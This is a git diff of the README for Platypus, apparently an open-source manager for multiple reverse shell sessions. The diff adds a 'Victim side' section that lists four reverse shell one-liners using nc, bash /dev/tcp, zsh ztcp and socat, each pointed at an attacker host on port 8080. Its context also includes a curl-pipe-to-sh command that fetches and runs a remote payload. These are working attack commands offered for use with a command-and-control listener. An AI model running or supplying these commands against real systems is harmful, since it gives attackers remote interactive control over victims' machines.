@@ -7,7 +7,14 @@ A modern multiple reverse shell sessions/clients manager via terminal written in
 - [x] Multiple client connections
 - [x] RESTful API
 - [x] Reverse shell as a service
-- [ ] Upgrade common reverse shell session into full interactive session
+
+#### Network Topology
+```
+Attack IP: 192.168.1.2
+    Reverse Shell Service: 0.0.0.0:8080
+    RESTful Service: 127.0.0.1:9090
+Victim IP: 192.168.1.3
+```
 
 #### Use Platypus from source code
 ```
@@ -23,12 +30,12 @@ go run platypus.go
 # ./Platypus_linux_amd64
 ```
 
-#### Network Topology
+#### Victim side
 ```
-Attack IP: 192.168.1.2
-    Reverse Shell Service: 0.0.0.0:8080
-    RESTful Service: 127.0.0.1:9090
-Victim IP: 192.168.1.3
+nc -e /bin/bash 192.168.1.2 8080
+bash -c 'bash -i >/dev/tcp/192.168.1.2/8080 0>&1'
+zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.1.2 8080 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.2:8080  
 ```
 
 #### Reverse shell as a Service
@@ -80,3 +87,4 @@ curl http://192.168.1.2:8080/192.168.1.2/8080|sh
 - [ ] RESTful API should auth
 - [ ] Use crontab
 - [ ] Use HR package to detect the status of client (maybe `echo $random_string`)
+- [ ] Upgrade common reverse shell session into full interactive session
